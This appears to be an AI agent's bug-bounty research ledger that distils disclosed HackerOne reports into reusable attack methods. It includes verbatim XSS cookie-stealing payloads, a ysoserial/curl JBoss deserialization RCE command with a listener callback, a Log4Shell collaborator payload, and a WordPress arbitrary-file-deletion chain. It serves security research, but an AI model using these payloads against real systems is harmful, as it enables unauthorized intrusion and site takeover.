  2. ENTRY POINT, verbatim: `GET /meet-external/spot-roomkeeper/v1/calendar/auth/init?successRedirectUrl=https%3A%2F%2Fadmin.8x8.vc%2F%23%2Frooms%2Fadd HTTP/2` / `Host: admin.8x8.vc` / `Authorization: <Member user's JWT>` (the reporter's other headers: `Accept: */*`, `Referer: https://admin.8x8.vc/`, `Content-Type: application/json`).
  3. THE RESPONSE, verbatim: `{"url":"https://app.cronofy.com/oauth/authorize?response_type=code&client_id=M0wBDPDXk6EQLaGCqp-pTN_VGt7_AtM9&redirect_uri=https://api-vo.jitsi.net/rosy/sso/cronofy/callback&scope=read_only&delegated_scope=read_only&state=<...>&avoid_linking=true"}` — the endpoint hands back a COMPLETE third-party OAuth authorize URL.
  4. COMPLETE THE FLOW with the ATTACKER's own third-party (Google/Outlook) account — the reporter: "There is no validation and the application will allow you to add your email".
  5. RESULT, verbatim: "Member user successfully added his/her email into admin's room area".
DETECTION SIGNAL: an integration / "connect <third-party>" endpoint that RETURNS an OAuth authorize URL (grep the client JS / route table for `auth/init`, `oauth/authorize`, `connect`, `integration`, `calendar`, `successRedirectUrl`, `redirect_uri`, `avoid_linking`); a `successRedirectUrl` / `redirect_uri` parameter that is caller-controlled; a flow that completes with no ownership or permission check on the target tenant/room; a role the UI marks as having NO access to the feature whose init endpoint still answers 200 with a usable authorize URL.
CHAIN: any authenticated low-privilege member (primitive: a role the UI denies the feature to) -> replay the integration-init request with the member's own JWT (primitive: no function-level permission check on the connect endpoint) -> the endpoint returns a third-party OAuth authorize URL (escalation: the attacker can now drive the linking flow) -> the attacker completes the OAuth with their OWN third-party account (escalation: nothing binds the resulting link to the admin/tenant) -> the attacker's e-mail/calendar is linked into the ADMIN's room area (impact: a write into a privileged tenant context by a user with no permission — integrity/privilege escalation, High 8.3 here; the caller-controlled `successRedirectUrl` is a second, open-redirect/phishing primitive).
TRANSFERABLE TEST: on ANY multi-role SaaS, enumerate the "connect <third-party>" / OAuth-init endpoints (the ones whose response is an `authorize?...` URL) and replay each with a LOW-privilege role's session; then (a) is the endpoint reachable at all by that role, (b) is `successRedirectUrl`/`redirect_uri` caller-controlled, and (c) COMPLETE the flow with your own third-party account and check whether the linkage lands in a privileged tenant/room you have no access to. Rule: an integration-init endpoint is itself an authorization surface — when the role check is missing there, the attacker's own third-party account becomes a write primitive inside someone else's privileged context.
DEDUPE/DELTA: 0 hits across all three write targets for `1486310`, `emperor`, `cronofy`, `meet-external`, `spot-roomkeeper`, `roomkeeper`, `successRedirectUrl`, `auth/init`, `oauth init`. Related-but-distinct recorded material: §17.285 (Shopify #1018489 — a connect endpoint takes the TARGET ACCOUNT ID FROM THE PATH and binds YOUR IdP to it -> backdoor login / ATO; the target is a user account and the direction is "your IdP onto their account"), the OAuth `redirect_uri`/`postMessage`/origin-check family (V-13, §17.160, §17.431) which concerns the CALLBACK, and the "UI-only entitlement gate" family (#347693 and the UI-only verification gate) which concerns a VALUE the UI hides. None records the INIT endpoint as the unguarded authorization surface, nor the caller-controlled `successRedirectUrl` as the carrier that lands the attacker's third-party account in a privileged tenant context.

SOURCE: https://hackerone.com/reports/2286764  2026-11-11
ROUTE: full reporter body via the live `.json` route -> HTTP 200, `visibility: full`, `vulnerability_information` read in full (the live HTML page timed out on this egress; the `.json` route carried the body). Liberapay, "Avatar URL is exposed in patron export for secret donations", weakness Privacy Violation, severity Medium 4.3 (AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N), reporter `mdivecky`, created 2023-12-14, disclosed 2023-12-15, no bounty, asset `*.liberapay.com` max_severity critical.
STATUS: UNVERIFIED (not reproduced — no Liberapay account was created and no export was downloaded; the endpoint, the field name and the impact are quoted verbatim from the report).
CLASS: sensitive information disclosure / broken privacy control — an ANONYMITY toggle is defeated by an INDIRECT identifier in a bulk export, not by the suppressed field itself (CWE-200 / CWE-213).
CORE METHOD:
  1. PREMISE TO VIOLATE, verbatim: "When user sets their donation Privacy level to \"Secret\" they are indicating that they don't want to be identified by the donation recipient."
  2. ENTRY POINT, verbatim: "By exporting the `patron_avatar_url`, in `https://liberapay.com/<account_name>/patrons/export.csv`, the user might be exposed just by doing a reverse image search for such avatar."
  3. The CSV therefore carries, for EVERY patron including the secret ones, an AVATAR URL — an identity link the toggle does not suppress.
  4. DEANONYMISE: reverse-image-search the avatar -> the donor's real identity.
DETECTION SIGNAL: any user-settable anonymity/privacy toggle ("secret", "anonymous", "private", "hide my identity") on a feature that also has a bulk representation; a `.csv`/`.json`/`.zip`/"download all" export whose columns include an identity-bearing field the toggle does not suppress — an AVATAR/PROFILE-PHOTO URL, an e-mail, a username, an external profile link; a toggle implemented as "don't show the name" rather than "don't include any identifier".
CHAIN: a donor opts into anonymity (primitive: a privacy control the user relies on) -> the recipient downloads the patron export (primitive: a bulk representation the toggle does not filter) -> the export carries `patron_avatar_url` (escalation: an INDIRECT identifier, not the suppressed name) -> a reverse image search on the avatar links the donation to the donor's real identity (impact: deanonymisation of a user who explicitly chose anonymity — doxxing/harassment exposure; the program rated Medium 4.3).
TRANSFERABLE TEST: for EVERY anonymity/privacy toggle, enumerate the bulk representations (CSV/JSON export, "download all", API list, print view) and check for identity-bearing fields BEYOND the one the toggle suppresses — avatar/profile-photo URLs, e-mails, usernames, external profile links. An avatar URL is a linkage key: run it through a reverse image search and see whether the anonymous user's real identity comes back. Rule: an anonymity toggle that suppresses the NAME but not the AVATAR is not anonymity — the export is the surface, and the indirect identifier is the leak.
DEDUPE/DELTA: 0 hits across all three write targets for `2286764`, `mdivecky`, `patron`, `patron_avatar_url`, `liberapay`, `reverse image search`, `anonymity toggle`, `indirect identifier`. Related-but-distinct recorded material: #347693 (a DISPLAY-SUPPRESSION is not an authorization — the SAME value the UI hides is returned by the page's JSON twin), the "privacy setting honoured on one surface but bypassed on another" family (WakaTime #3003716), and the generic "diff what the export contains against what your ACL shows in the UI" detection signal (methodologies-2026-11-07 ~line 608). None records the mechanism here: the toggle suppresses the DIRECT identifier (the name) while the export carries an INDIRECT one (the avatar URL) whose link to identity is established OUT-OF-BAND by a reverse image search — the leak is a DIFFERENT field, not the suppressed one.

NOTE — reader pass 2026-11-11 (batch 154: 6 assigned sources read ONE BY ONE in the given order — 2 entries appended + 2 §17 slots). NEW: (1) #1486310 (8x8 — the OAuth/third-party-connect INIT endpoint `GET /meet-external/spot-roomkeeper/v1/calendar/auth/init?successRedirectUrl=...` carries no role check, returns a full Cronofy authorize URL, and completing it with the attacker's own account links the attacker's e-mail into the ADMIN's room area -> §17.475); (2) #2286764 (Liberapay — the "Secret donation" anonymity toggle suppresses the NAME but the patron CSV export carries `patron_avatar_url`, an INDIRECT identifier that deanonymises the donor via reverse image search -> §17.476). VALID-BUT-NOT-APPENDED: #1572591 (LinkedIn, full body — replay the admin's `GET /voyager/api/voyagerOrganizationDashEmailDomainMappings?...&company=urn:li:fsd_company:81541206` with an Analyst role's cookie+CSRF and read the company's approved e-mail domains; the METHOD — "the role is in the token, not the request, replay the admin's request unchanged with a lower-role bearer" — is already recorded verbatim at ledger ~9215, and the "UI-only entitlement gate" family covers the read variant; delta = the `voyagerOrganizationDash*` carrier and the GET/read shape), #1429014 (U.S. DoD, full body — the canonical Log4Shell payload `${jndi:ldap://x${hostName}.log4j.<collaborator>/a}` in a URL parameter with a Burp Collaborator callback; the class is recorded 12x/16x/8x as Log4Shell/log4j/CVE-2021-44228, the payload is the canonical one, and the report is 2021 — outside the freshness window), #1312365 (Affirm, full body — a CNAME to a hostname under a domain whose TLD is not registered, claimable by registering the TLD; the method is already §17.377 ("a CNAME whose target is a hostname under an UNREGISTERED domain is a subdomain takeover claimable by registering the domain"), and the TLD-level variant is a sub-case of "check whether the namespace is registered"; the claim step is theoretical — registering a TLD is an ICANN process — and the reporter did not execute it; program rated Low). INVALID/UNREADABLE: #2312320 (Enjin, "Weak Email Verification ...", `visibility: no-content`, `vulnerability_information` 0 B on the live `.json` route; the live page, `r.jina.ai`, the browser tool and the Wayback capture all fail to render a researcher body — the browser tool returns "Sorry, something went wrong" and the Wayback capture is empty; the only public text is the researcher's one-paragraph summary plus the team's one-sentence summary, with no endpoint, no request shape, no payload and no bypass detail; the class — response manipulation to bypass an e-mail-verification step — is already covered by V-07 and the recorded verification-bypass family). 0 fabricated. Knowledge intake only — no target was touched; every network call this pass was a read-only fetch of the 6 assigned HackerOne reports (live page via `web_extract`, the `.json` route, `r.jina.ai`, Wayback, the browser tool) plus local dedupe greps against the three write targets. No hunt, no scan, no lab.

SOURCE: https://hackerone.com/reports/1054526  2026-11-11
ROUTE: full reporter body (1,692 B) via the live `.json` route -> HTTP 200, `visibility: full`, `vulnerability_information` read in full; corroborated by the local disclosed-reports mirror `/tmp/h1_train.parquet` (row 8312, same body) and by `web_extract` on the live HTML page. Automattic / WordPress.com, "Stored XSS in wordpress.com", weakness Cross-site Scripting (XSS) - Stored, severity High (7 ~ 8.9), reporter `ucuping`, created 2020-12-09, disclosed 2021-02-17, bounty yes.
STATUS: UNVERIFIED (not reproduced — no WordPress.com / Crowdsignal account was touched this pass; the payload, the field and every step below are quoted verbatim from the report).
CLASS: stored XSS via a `<noscript>` PARSER DIFFERENTIAL (mXSS) in a third-party plugin's stored "Style Name" — the sanitizer's parse (scripting disabled) and the browser's `innerHTML` parse (scripting enabled) disagree about where the `<noscript>` raw-text context ends (CWE-79 / CWE-183).
CORE METHOD:
  1. ENTRY POINT: WordPress.com polling (Crowdsignal) -> Feedback -> Polling -> add/edit a post -> "All Styles" -> "Add a new Style" -> the Style NAME field (stored; rendered later inside a `<noscript>` block).
  2. PAYLOAD, verbatim: `<noscript><p title="</noscript><img src=x onerror=alert(document.cookie)>">` — the nested `</noscript>` sits INSIDE the `title` attribute value; a scripting-disabled parser keeps it as attribute text, while the browser's innerHTML parser (scripting enabled) ends the `<noscript>` raw-text context there and materialises a real `<img onerror>`.
  3. Save the Style (the payload is stored verbatim).
  4. Invite the victim to the blog (Manage -> Users -> invite by username/e-mail); the victim opens Feedback -> Polling -> add/edit a post -> All Styles -> selects the attacker's Style -> the payload executes in the victim's session.
DETECTION SIGNAL: a stored field rendered inside a `<noscript>` element (or any raw-text/foreign-content element) where the sanitizer's parse and the browser's parse disagree; a payload containing a nested `</noscript>` inside an attribute value; a "Style"/"template"/"snippet"/"preset" NAME field in an embedded third-party plugin (Crowdsignal, a polling/survey widget) that is rendered into a page the victim opens.
CHAIN: attacker saves a Style whose name carries the noscript-mXSS payload (primitive: a stored, user-controlled field) -> the value is rendered inside a `<noscript>` block (primitive: parser differential) -> the victim opens the Style (escalation: the payload executes in the victim's origin) -> session-cookie theft / actions as the victim (impact: stored XSS with session impact; the report's stated escalation is inviting the victim as manager/administrator and phishing; program rated High 7 ~ 8.9).
TRANSFERABLE TEST: for ANY stored field rendered inside a `<noscript>` block, submit `<noscript><p title="</noscript><img src=x onerror=alert(document.cookie)>">` (plus the `<noscript><p title="</noscript><svg onload=…>` variant), then load the render in a scripting-ENABLED browser and inspect the LIVE DOM for an `<img onerror>`/`<svg onload>` node that the raw stored string did not visibly contain. Rule: `<noscript>` is a raw-text context for the browser's `innerHTML` parser but a markup context for a scripting-disabled sanitizer — a nested `</noscript>` inside an attribute value is the differential; the payload is inert in the sanitizer's view and active in the browser's.
DEDUPE/DELTA: 0 hits across all three write targets for `1054526`, `ucuping`, `crowdsignal`, `Style Name`, `<noscript><p`, `</noscript><img`. The GENERAL method (noscript nesting correction as an mXSS differential) is recorded in the playbook V-07 ("Parsing misalignment (mutation XSS / mXSS vs DOMPurify)", Bugbountyskills.md ~13626) and the xss-testing skill's variants-1.md §2.9, but neither gives a payload; the ledger's other parser-differential entries (#1147433 `">]<img …>`, #1805899 `<svg><style>…`, #534450 the Grammarly noscript ENCODING gap) are different contexts/mechanisms. DELTA here = the exact noscript payload + the Crowdsignal "Style Name" carrier. No §17 slot (general method already covered).

SOURCE: https://hackerone.com/reports/968232  2026-11-11
ROUTE: full reporter body (598 B) via the live `.json` route -> HTTP 200, `visibility: full`, `vulnerability_information` read in full; corroborated by the local mirror `/tmp/h1_train.parquet` (row 9745, same body). Nextcloud, "Stored XSS in collabora via user name", weakness Cross-site Scripting (XSS) - Stored, severity Low, reporter `meliodas19`, created 2020-08-27, disclosed 2020-09-19, no bounty, asset `nextcloud/viewer` (SOURCE_CODE) max_severity critical.
STATUS: UNVERIFIED (not reproduced — no Nextcloud/Collabora instance was touched this pass; the payload, the field and every step below are quoted verbatim from the report).
CLASS: stored XSS via a user-controlled DISPLAY NAME rendered in an embedded document editor, executing in the PARENT window origin (CWE-79).
CORE METHOD:
  1. ENTRY POINT: the account display name (Nextcloud, shown in the Collabora/CODE co-editing editor).
  2. PAYLOAD, verbatim: `<img src=a onerror=alert(window.parent.location)>`.
  3. Create a document and share it with the victim (it appears in the victim's files as shared); the attacker opens the document and waits until the victim also opens it — the attacker's name is rendered in the editor and the payload executes.
  4. The `window.parent.location` in the payload is the PROOF: it returns the PARENT window's URL, i.e. the handler runs in the parent (Nextcloud) origin, not merely in the Collabora iframe origin.
DETECTION SIGNAL: a user-controlled display name rendered in an iframe-based editor/viewer/co-editing session; a payload using `window.parent.location`/`window.parent.document` to test whether the handler executes in the parent origin; a shared-document flow where the participant list renders each user's name.
CHAIN: attacker sets a display name carrying the payload (primitive: a user-controlled name field) -> the name is rendered in the shared-document editor (primitive: a render surface the victim drives) -> the payload executes in the PARENT origin (escalation: same-origin script execution on the parent app) -> session/CSRF-token theft or actions as the victim (impact: stored XSS with session impact; the program rated it Low and paid no bounty).
TRANSFERABLE TEST: set your own display name to `<img src=a onerror=alert(window.parent.location)>`, then open a shared document/co-editing session and check (a) whether the payload fires and (b) whether `window.parent.location` returns the PARENT app's URL (proving parent-origin execution) or throws/returns undefined (iframe-origin only). Rule: a display name rendered inside an embedded editor is a stored-XSS carrier, and the `window.parent.*` proof tells you whether you have the parent origin (a same-origin XSS on the app) or only the iframe origin.
DEDUPE/DELTA: 0 hits across all three write targets for `968232`, `meliodas19`, `collabora`, `window.parent`, `parent.location`. The ledger's display-name XSS entries (#4880 GitLab approvals widget, #4567 VCS ref names, #534450 Grammarly) are different carriers; the "confirm the executing origin (viewer iframe vs app origin)" line (ledger ~4104) is about document viewers, not a name in a co-editing editor. DELTA here = the Collabora/Nextcloud carrier + the `window.parent.location` parent-origin proof. No §17 slot (general method already covered).

NOTE — reader pass 2026-11-11 (batch 165, numbered after the highest label in the file, 164; the previous pass's "batch 154" label duplicates an earlier batch — 6 assigned sources read ONE BY ONE in the given order — 2 entries appended, 0 §17 slots). NEW: (1) #1054526 (Automattic/WordPress.com — a stored Crowdsignal "Style Name" rendered inside a `<noscript>` block; the payload `<noscript><p title="</noscript><img src=x onerror=alert(document.cookie)>">` exploits the noscript parser differential -> stored XSS with session impact; the general mXSS method is V-07, the exact payload + carrier is new); (2) #968232 (Nextcloud — a display name set to `<img src=a onerror=alert(window.parent.location)>` executes in the PARENT origin when the victim opens a shared Collabora document; the `window.parent.*` proof is new). VALID-BUT-NOT-APPENDED: #708019 (U.S. DoD, full body — aquatone subdomain enumeration -> browse the index page -> an unauthenticated `/wireframes/admin/round12/tsp_0-awarded.html` path showing internal wireframe docs and logged-in user names; the method is generic recon (subdomain enum -> exposed admin path) and the impact is weak info disclosure, so no new specific technique). INVALID/UNREADABLE: #1011463 (VK.com, `visibility: no-content`, `vulnerability_information` 0 B in the live `.json`, the local mirror AND the Wayback; the only public text is the team summary "XSS on the wall in m.vk.com." — no endpoint, no payload, no param), #892610 (Radancy, `visibility: no-content`, 0 B in the live `.json` -> HTTP 404, the local mirror AND every Wayback capture (2020/2022/2023 are JS-only SPA shells); the only retrievable text is the meta description "the 50x status code server responded with an html page containing the nginx version" — a version-disclosure/ineligible class with no researcher body), #751284 (PUBG, `visibility: no-content`, 0 B in the live `.json`, the local mirror, `r.jina.ai` (IP-blocked) and the browser tool ("Sorry, something went wrong"); the only public text is the team summary "an XSS vulnerability caused by query parameters not being properly sanitized" — no param name, no payload, no URL). 0 fabricated. Knowledge intake only — no target was touched; every network call this pass was a read-only fetch of the 6 assigned HackerOne reports (live page via `web_extract`, the `.json` route, `r.jina.ai`, Wayback, the browser tool) plus local dedupe greps against the three write targets. No hunt, no scan, no lab.

SOURCE: https://hackerone.com/reports/423496  2026-11-11
STATUS: UNVERIFIED (not reproduced — no Shopify Wholesale store was configured and no invite token was generated; the request shapes, the URL and every step below are quoted verbatim from the report).
CLASS: broken access control / cross-tenant capability token — an invite/accept token is validated without binding it to the tenant that ISSUED it, so the tenant that CONSUMES it is resolved independently (from the request host) and the two disagree (CWE-863 / CWE-639 / CWE-284).
CORE METHOD:
  1. PREMISE TO VIOLATE, verbatim: "By default, account registration is disabled on Shopify Wholesale, requiring customers to be manually invited" — "Wholesale account signup is disabled. Customers need to be manually invited from the Customers page."
  2. SET UP TWO TENANTS: configure Wholesale for two separate Shopify stores at https://wholesale.shopifyapps.com — Store A = the target (jackstore-7), Store B = the attacker's own (jackstore-6).
  3. AS STORE B, create a product/price list and add at least one customer to Wholesale.
  4. GENERATE THE INVITE from Store B's admin: `https://jackstore-6.myshopify.com/admin/apps/wholesale/admin/shops/7662/accounts` -> select a customer -> generate an invite link. The link is of the form `https://jackstore-6.wholesale.shopifyapps.com/accounts/invitation/accept?invitation_token=KqhsT8sWFbbEdxpHxHt7`.
  5. THE BYPASS, verbatim: "Replace the store domain in the link with Store A." — swap the HOST from `jackstore-6.wholesale.shopifyapps.com` to Store A's wholesale host, keeping the SAME `invitation_token`.
  6. OBSERVE, verbatim: "the invitation token is still treated as valid for Store A, and an account can be registered."
  7. RESULT, verbatim: "Upon registration, the user will have access to the entire Wholesale store."
DETECTION SIGNAL: an invite/join/accept URL whose capability is a bearer token in the query string (`?invitation_token=`, `?token=`, `?invite=`); a multi-tenant SaaS where each tenant has its OWN hostname/subdomain (so the tenant is resolved from the HOST, not from the token); a token-issuing tenant and a token-consuming tenant that are resolved independently; a "signup disabled / invite only" gate whose enforcement lives only in the UI. TELL: the token validates, but the account lands on the tenant named by the host.
CHAIN: the attacker mints a capability in their OWN tenant (primitive: any customer can generate an invite link) -> the token is a global bearer that is NOT bound to the issuing tenant (primitive: no tenant check on the accept endpoint) -> the attacker replays it against a SIBLING tenant's host (escalation: the consumer trusts the host, not the token's issuer) -> an account is registered on the target store (escalation: the "invite only" gate is bypassed) -> the attacker has access to the entire Wholesale store (impact: unauthorized access to a private B2B store's products/documentation; program rated Medium 5.3 AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N, bounty paid).
TRANSFERABLE TEST: on ANY multi-tenant product with an invite/join/accept flow — (1) create two tenants (yours + a target); (2) mint an invite token in YOUR tenant and capture the accept URL; (3) swap the HOST to the target tenant's hostname/subdomain, keeping the token unchanged; (4) open the rewritten URL and check whether the token is accepted and an account is created on the TARGET tenant. Rule: an invite token that is not bound to the tenant that issued it is a cross-tenant account-creation primitive — the accept endpoint must re-derive the tenant from the token, not from the request host.
DEDUPE/DELTA: 0 hits across all three write targets for `423496`, `cablej`, `wholesale`, `invitation_token`, `shopifyapps`, `wholesale.shopifyapps`, `invitation/accept`, `join any store`, `signup restriction`, `store domain`, `capability token`. The `tenant scop` hits (ledger ~13279; Bugbountyskills ~1505/~1889) are a generic "derive tenant scope from the session" detection signal, and the `invite link` hits (ledger ~2545, ~13822; §17.461) are about harvesting ids / hijacking the mail transport — none records an invite/accept token that is validated without tenant binding and replayed against a sibling tenant's host. New general method -> §17.477.

SOURCE: https://hackerone.com/reports/221294  2026-11-11
ROUTE: the live `.json` route returns `visibility: no-content` with `vulnerability_information` 0 B (confirmed also by the local mirror /tmp/h1_train.parquet); the live HTML page and the browser tool both return "Sorry, something went wrong"; `r.jina.ai` is IP-blocked (HTTP 401); the Wayback capture is a JS-only SPA shell whose META DESCRIPTION carries the team summary — "The researcher discovered that a Starbucks online system running on the domain `http://card.starbucks.in/` performs deserialization of java objects that are submitted by users on a specific path belonging to JBOSSMQ without sanitizing/validating the data. As a result, an attacker can inject a malicious java object capable of running a command on the system during the deserialization process." and "This was assigned CVE-2017-7504". The exact endpoint, request shape and detection signal were then read this pass from the credited researcher's own PoC repo (joaomatosf/JavaDeserH2HC — "PoC CVE-2017-7504 - JBossMQ JMS Invocation Layer") and the CVE's public references (NVD CVE-2017-7504; vulhub jboss/CVE-2017-7504; the projectdiscovery nuclei template).
STATUS: UNVERIFIED (not reproduced — no JBoss instance was stood up and no payload was sent; the endpoint, request shape and detection signal are quoted from the sources above, not from the HackerOne researcher body, which is 0 B).
CLASS: insecure deserialization -> RCE — an unauthenticated servlet deserializes the raw POST body with no class filtering (CWE-502); JBossMQ's JMS-over-HTTP Invocation Layer, enabled by default in JBoss AS <= 4.x.
CORE METHOD:
  1. ENTRY POINT, verbatim (NVD): "HTTPServerILServlet.java in JMS over HTTP Invocation Layer of the JbossMQ implementation, which is enabled by default in Red Hat Jboss Application Server <= Jboss 4.X does not restrict the classes for which it performs deserialization, which allows remote attackers to execute arbitrary code via crafted serialized data."
  2. THE REQUEST, verbatim (vulhub): the vulnerability "exists in the `/jbossmq-httpil/HTTPServerILServlet` request"; generate the gadget with ysoserial and POST the raw bytes:
     `java -jar ysoserial-master-30099844c6-1.jar CommonsCollections5 "touch /tmp/success" > 1.ser`
     `curl http://your-ip:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @1.ser`
     (the nuclei template uses `POST {{BaseURL}}/jbossmq-httpil/HTTPServerILServlet` with `Content-Type: application/octet-stream` and a base64-decoded serialized body).
  3. THE SINK: the servlet calls `readObject()` on the body and only then tries to cast it to `org.jboss.mq.il.http.HTTPILRequest` — the cast fails AFTER deserialization, so the gadget chain has already run.
  4. THE GADGET: a CommonsCollections chain (CommonsCollections5 in the vulhub lab, CommonsCollections6 in the nuclei template) — Commons-Collections is on the JBoss 4.x classpath by default.
  5. PROOF: the command runs (`/tmp/success` is created); the response is HTTP 200 carrying `java.lang.ClassCastException: ... cannot be cast to org.jboss.mq.il.http.HTTPILRequest`.
DETECTION SIGNAL: a JBoss AS 4.x / EAP host (Shodan `http.title:"JBoss"`, FOFA `app="JBoss"`); the default-on `jbossmq-httpil.sar` deployment; a `POST` to `/jbossmq-httpil/HTTPServerILServlet` (and the sibling `/invoker/JMXInvokerServlet`, `/invoker/EJBInvokerServlet`, `/invoker/readonly`, `/jmx-console/HtmlAdaptor`, `/web-console/Invoker`) that answers 200 with a `ClassCastException` naming `org.jboss.mq.il.http.HTTPILRequest`; a body that is a raw Java serialized stream (`\xAC\xED` magic). TELL: the deserialization happens BEFORE the type check, so the exception is the proof of the sink.
CHAIN: any unauthenticated caller (primitive: the servlet is reachable with no auth) -> POST a ysoserial CommonsCollections gadget as the raw body (primitive: no class filter on `readObject`) -> the gadget chain executes during deserialization (escalation: code execution as the JBoss service account) -> command execution / full system compromise (impact: Critical, CVSS 3.0 AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8; the program rated it Critical 9.0 and the report was disclosed 2017-05-22).
TRANSFERABLE TEST: on ANY JBoss AS 4.x / EAP host in scope — (1) fingerprint for JBoss (title/server header, `/jmx-console/`, `/web-console/`, `/invoker/JMXInvokerServlet`); (2) `POST /jbossmq-httpil/HTTPServerILServlet` with `Content-Type: application/octet-stream` and a ysoserial CommonsCollections5/6 gadget whose command is an out-of-band callback (`curl http://<listener>/<marker>`) or a file write you can observe; (3) confirm with the `ClassCastException ... HTTPILRequest` + 200 response and the callback/file. Rule: a servlet that deserializes the raw POST body and only then casts it to its expected type has already executed your gadget by the time it throws — the ClassCastException is the confirmation, not a failure.
DEDUPE/DELTA: 0 hits across all three write targets for `221294`, `joaomatosf`, `jboss`, `JbossMQ`, `jbossmq`, `HTTPServerILServlet`, `HTTPILRequest`, `JMS over HTTP`, `CVE-2017-7504`, `CommonsCollections5`. The ledger's 51 deserialization entries are other carriers/sinks (Liferay JSONWS c3p0 `HexAsciiSerializedMap` #2742457 / §17.398, DNN cookie BinaryFormatter #876708 / §17.438, Kafka JAAS JNDI, Tomcat DefaultServlet, Ruby Marshal §17.10, etc.) — none records the JBossMQ JMS-over-HTTP `HTTPServerILServlet` endpoint, the `application/octet-stream` POST shape, or the `ClassCastException -> HTTPILRequest` detection signal. The general "Java deserialization of untrusted input -> RCE" method is already owned, so NO §17 slot (batch-165 precedent: a new carrier for an owned class gets no slot).

NOTE — reader pass 2026-11-11 (batch 166, numbered after the highest label in the file, 165 — 6 assigned sources read ONE BY ONE in the given order — 2 entries appended, 1 §17 slot). NEW: (1) #423496 (Shopify — the Wholesale invite/accept token is a global bearer that is not bound to the tenant that issued it; mint it in your own store and replay it against a SIBLING store's wholesale hostname to register an account on a store that never invited you -> §17.477); (2) #221294 (Starbucks/card.starbucks.in — JBossMQ's JMS-over-HTTP `HTTPServerILServlet` deserializes the raw POST body with no class filter, so a ysoserial CommonsCollections gadget posted as `application/octet-stream` runs before the `ClassCastException ... HTTPILRequest` is thrown -> RCE, CVE-2017-7504; the researcher body is 0 B, the technique was recovered from the team summary + the credited PoC/CVE references; no §17 slot — the general Java-deserialization method is already owned). VALID-BUT-NOT-APPENDED: #360811 (Starbucks, full body — a public GitHub repo of an employee carries SAP S-user credentials for a cloud HANA service and starbuckstest domain credentials; the method — GitHub secret hunting -> credential replay — is already recorded at §9.5 "GitHub dorking with the API" and #761791, and the reporter explicitly did not verify access, so there is no new specific technique and no demonstrated impact), #569241 (Shopify/Oberlo, full body — reflected XSS in the `shop` parameter of `https://app.oberlo.com/auth?shop=%3C/noscript%3E%3Cimg%20src=x%20onerror=prompt(document.domain)%3E`; a reflected-param primitive with no chain, rated Low, no bounty — chain material only). INVALID: #210238 (Rockstar Games — `visibility: no-content`, 0 B body; the Wayback meta description says an invalid `Accept` header on `http://www.rockstargames.com/index` caused a full path disclosure to the webroot, and the program added "Path Disclosures" to its Excluded issues — an ineligible P4 class with no chain), #500588 (JamieWeb — missing `X-DNS-Prefetch-Control`, `X-Download-Options` and `Public-Key-Pins` headers; the hardening/missing-best-practice class that doctrine §2(c) excludes, no concrete technique). 0 fabricated. Knowledge intake only — no target was touched; every network call this pass was a read-only fetch of the 6 assigned HackerOne reports (live `.json` route via curl/web_extract, the live HTML page, the browser tool, `r.jina.ai`, the Wayback capture, the credited PoC repo, NVD/vulhub/nuclei for CVE-2017-7504) plus local dedupe greps against the three write targets. No hunt, no scan, no lab.

SOURCE: https://hackerone.com/reports/3931777  2026-11-11
ROUTE: `web_extract` of the live page -> HTTP 200, the disclosed report read IN FULL (root-cause code with file:line, the curl PoC and the quoted proof output). Metadata: WordPress (asset Gutenberg / Core), "Author → arbitrary file deletion anywhere on disk (site takeover) via `POST /wp/v2/media/<id>/finalize` poisoning `_wp_attachment_metadata`", weakness Path Traversal, severity Critical (9.9), reporter `jakubk`, submitted 2026-08-11, disclosed 2026-08-28, state Resolved, bounty hidden.
STATUS: UNVERIFIED (not reproduced — no WordPress instance was stood up this pass; every request shape, code line and quote below is taken from the report body).
CLASS: path traversal / arbitrary file deletion -> site takeover — a metadata-finalize endpoint writes attacker-supplied filenames VERBATIM, and the deletion guard derives BOTH the target file AND its confinement directory from that same attacker-controlled metadata, so the containment check is a no-op (CWE-22 / CWE-73).
CORE METHOD (verbatim from the report):
  1. ENTRY POINT: `POST /wp/v2/media/<id>/finalize` (route `'/'.$this->rest_base.'/(?P<id>[\d]+)/finalize'`, `WP_REST_Server::CREATABLE`, callback `finalize_item`, permission `edit_media_item_permissions_check` = `current_user_can('upload_files')` + `edit_post` on the attachment — an Author satisfies both on its own upload). Enabled by default on every HTTPS production site (`wp_is_client_side_media_processing_enabled()`); in the released Gutenberg plugin the gate is unconditional.
  2. POISON: `POST /?rest_route=/wp/v2/media/8/finalize`, `Content-Type: application/json`, body `{"sub_sizes":[{"image_size":"thumbnail","file":"wp-config.php","width":150,"height":150,"mime_type":"image/jpeg","filesize":1}]}` — `finalize_item()` writes `$metadata['file'] = $sub_size['file']` (top-level, from `image_size:"original"`) and `$metadata['sizes'][$image_size]['file']` VERBATIM; the schema is only `array('type'=>'string')` — "no `sanitize_callback`, no `pattern`, no `sanitize_file_name()`, no basename check anywhere on that path".
  3. LAUNDER the poisoned size into protected meta: read the image-editor nonce WordPress prints to the Author in the media popup (`imageEdit.open( 8, "72cf52ebf1" )`, `wp-admin/includes/media.php:1702`), then `POST /wp-admin/admin-ajax.php` with `action=image-editor&_ajax_nonce=<nonce>&postid=8&do=save&target=all` and `history=[{"r":90}]` — `wp_ajax_image_editor()` copies `$meta['sizes'][$size]` VERBATIM into `_wp_attachment_backup_sizes` (gate is only `edit_post` + that nonce).
  4. ESCAPE the uploads root: re-finalize with `{"sub_sizes":[{"image_size":"original","file":"../../x.jpg","width":600,"height":400,"filesize":1}]}` — `path_join($base,$path)` "returns `$path` unchanged whenever it is absolute", so the poisoned top-level `file` escapes `basedir`.
  5. SINK: `DELETE /?rest_route=/wp/v2/media/8&force=true` (the Author deletes its OWN attachment) -> `wp_delete_attachment_files()`'s `$backup_sizes` branch computes `$del_dir = path_join($uploadpath['basedir'], dirname($meta['file']))` (attacker-chosen DIRECTORY) and `$del_file = path_join(dirname($meta['file']), $size['file'])` (attacker-chosen TARGET) — `wp_delete_file_from_directory($del_file, $del_dir)`'s containment test compares against a directory derived from the SAME poisoned field, so it always passes. Every other branch (`sizes`, `original_image`, `source_image`, `animated_video*`) confines via `get_attached_file()` and is safe; only `$backup_sizes` is broken.
  6. PROOF/IMPACT: `wp-config.php` is destroyed and "the site is handed to the unauthenticated installer" — full site takeover from the Author role (program: Critical 9.9).
